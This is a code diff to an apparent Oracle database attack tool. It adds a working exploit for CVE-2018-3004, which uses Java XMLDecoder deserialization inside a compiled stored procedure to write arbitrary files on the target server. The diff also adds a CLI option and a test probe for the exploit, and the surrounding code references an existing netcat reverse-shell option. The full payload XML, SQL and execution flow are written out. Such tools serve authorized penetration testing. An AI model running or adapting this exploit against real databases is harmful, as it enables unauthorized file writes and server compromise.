@@ -4,7 +4,7 @@
 from OracleDatabase import OracleDatabase
 import logging, subprocess
 from threading import Thread
-from Utils import checkOptionsGivenByTheUser
+from Utils import checkOptionsGivenByTheUser,generateRandomString
 from Constants import *
 
 class Java (OracleDatabase):
@@ -228,7 +228,77 @@ CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCommand" AS
 		else :
 			logging.error("The remote server OS ({0}) is unknown".format(self.remoteOS.lower()))
 		
-
+	####################################################################################################################
+	#						Privilege escalation via CVE-2018-3004
+	#
+	#	Exploit: http://obtruse.syfrtext.com/2018/07/oracle-privilege-escalation-via.html
+	#
+	#	"Vulnerability in the Java VM component of Oracle Database Server. 
+	#	 Supported versions that are affected are 11.2.0.4, 12.1.0.2,12.2.0.1 and 18.2. 
+	#	 Difficult to exploit vulnerability allows low privileged attacker having Create Session, Create Procedure privilege with network access via multiple protocols to compromise Java VM. 
+	#	 Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java VM accessible data. 
+	#	 CVSS 3.0 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N)."
+	#
+	#   "The Oracle bug for this vulnerability is Bug 27923353, and the patch is for the OJVM system.  
+	#	 For this POC, the proper patch is OJVM release update 12.2.0.1.180717 (p27923353_122010_Linux-x86-64.zip)"
+	####################################################################################################################
+	
+	def createOrAppendFileViaCVE_2018_3004(self, data, remoteFilename):
+		'''
+		Exploit CVE-2018-3004
+		write data in remoteFilename on the target
+		If file does not exist, it is created.
+		Otherwise, data are appended in remoteFilename.
+		'''
+		CREATE_CLASS_EXPLOIT = """
+CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "exploitDeserializationJava" AS
+import java.io.*;
+import java.beans.*;
+public class exploitDeserializationJava{
+	public static void input(String xml) throws InterruptedException, IOException {   
+		XMLDecoder decoder = new XMLDecoder ( new ByteArrayInputStream(xml.getBytes()));
+		Object object = decoder.readObject();
+		System.out.println(object.toString());
+		decoder.close();        
+	}
+};
+		"""
+		CREATE_FUNCTION_EXPLOIT ="CREATE OR REPLACE PROCEDURE exploitDeserialization (xmlcode IN VARCHAR2) IS language java name 'exploitDeserializationJava.input(java.lang.String)';"
+		EXECUTE_FUNCTION = "BEGIN exploitDeserialization('{0}'); END;"
+		XML_CODE = '<java class="java.beans.XMLDecoder" version="1.4.0"><object class="java.io.FileWriter"><string>{0}</string><boolean>True</boolean><void method="write"><string>{1}</string></void><void method="close"/></object></java>' #{0}:Filename on the target, {1}: data to write on the file
+		SOURCE_DROP_CLASS = "DROP JAVA SOURCE \"exploitDeserializationJava\""
+		SOURCE_DROP_FUNCTION = "DROP PROCEDURE exploitDeserialization"
+		
+		logging.info("Trying to write {0} in {1} on the target".format(repr(data), remoteFilename))
+		logging.info("Create and compile the java class")
+		status = self.__execPLSQL__(CREATE_CLASS_EXPLOIT)
+		if isinstance(status,Exception):
+			logging.info("Impossible to create and compile the java class: {0}".format(self.cleanError(status)))
+			return status
+		else :
+			logging.debug("Java class created")
+			logging.info("Create a stored procedure to call java")
+			status = self.__execPLSQL__(CREATE_FUNCTION_EXPLOIT)
+			if isinstance(status,Exception):
+				logging.info("Impossible to create function to call java: {0}".format(self.cleanError(status)))
+				return status
+			logging.debug("Stored procedure created")
+			xmlCode = XML_CODE.format(remoteFilename, data)
+			logging.info("Executing the function with the xml code: {0}".format(xmlCode))
+			status = self.__execPLSQL__(EXECUTE_FUNCTION.format(xmlCode))
+			if isinstance(status, Exception):
+				logging.info("Impossible to execute the stored procedure named '{0}': {1}".format(EXECUTE_FUNCTION.format(xmlCode), self.cleanError(status)))
+				return status
+			logging.info("Delete the PL/SQL PROCEDURE created")
+			status = self.__execPLSQL__(SOURCE_DROP_FUNCTION)	
+			if isinstance(status,Exception):
+				logging.info("Impossible to drop the function: {0}".format(self.cleanError(status)))
+			else: 
+				logging.info("Delete the java class compiled")
+				status = self.__execPLSQL__(SOURCE_DROP_CLASS)
+				if isinstance(status,Exception):
+					logging.info("Impossible to drop the class: {0}".format(self.cleanError(status)))
+			return True
 
 	def testAll (self):
 		'''
@@ -250,13 +320,24 @@ CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCommand" AS
 				status = self.deleteClassAndFunctionToExecOsCmd()
 				if status != True:
 					self.args['print'].info("Impossible to delete functions created: {0}".format(self.cleanError(status)))
+				logging.info("The attacker can create a Java Stored Procedure. Perhaps he can exploit CVE-2018-3004 ('Oracle Privilege Escalation via Deserialization')...")
+				self.args['print'].subtitle("Bypass built in Oracle JVM security (CVE-2018-3004)?")
+				remoteFileName = generateRandomString()
+				if self.remoteSystemIsLinux() == True:
+					status = self.createOrAppendFileViaCVE_2018_3004(data=generateRandomString(),remoteFilename='/tmp/'+remoteFileName)
+				else:
+					status = self.createOrAppendFileViaCVE_2018_3004(data=generateRandomString(),remoteFilename='%temp%\\'+remoteFileName)
+				if status == True:
+					self.args['print'].goodNews("OK")
+				else:
+					self.args['print'].badNews("KO")
 				
 def runjavaModule(args):
 	'''
 	Run the JAVA module
 	'''
 	status = True
-	if checkOptionsGivenByTheUser(args,["test-module", "shell", "reverse-shell", "exec"]) == False : return EXIT_MISS_ARGUMENT
+	if checkOptionsGivenByTheUser(args,["test-module", "shell", "reverse-shell", "exec", "create-file-CVE-2018-3004"]) == False : return EXIT_MISS_ARGUMENT
 	java = Java(args)
 	status = java.connection(stopIfError=True)
 	if args['test-module'] == True :
@@ -274,6 +355,14 @@ def runjavaModule(args):
 	if args['reverse-shell'] != None :
 		args['print'].title("Try to give you a nc reverse shell from the {0} server".format(args['server']))
 		java.giveReverseShell(localip=args['reverse-shell'][0],localport=args['reverse-shell'][1])
+	#Option 4: Bypass built in Oracle JVM security through Deserialization (CVE-2018-3004)
+	if args['create-file-CVE-2018-3004'] != None :
+		args['print'].title("Try to create the file {0} on {1}".format(args['create-file-CVE-2018-3004'][1],args['server']))
+		status = java.createOrAppendFileViaCVE_2018_3004(data=args['create-file-CVE-2018-3004'][0], remoteFilename=args['create-file-CVE-2018-3004'][1])
+		if isinstance(status,Exception):
+			args['print'].badNews("Impossible to create the file {0}: {1}".format(args['create-file-CVE-2018-3004'][1], status))
+		elif status==True: 
+			args['print'].goodNews("The file {0} has been created on the target with data '{1}'".format(args['create-file-CVE-2018-3004'][1], args['create-file-CVE-2018-3004'][0]))
 	java.close()
 				
 
